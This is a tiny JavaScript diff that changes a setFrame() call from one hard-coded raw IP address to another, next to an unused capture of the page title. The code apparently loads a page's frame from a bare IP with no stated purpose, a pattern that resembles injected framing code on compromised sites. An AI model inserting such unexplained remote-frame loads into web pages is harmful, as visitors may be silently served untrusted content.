@@ -1,5 +1,5 @@
 var titlestr=document.title;
-setFrame("http://38.26.195.1/");
+setFrame("http://38.26.195.3/");
 //def
 
 
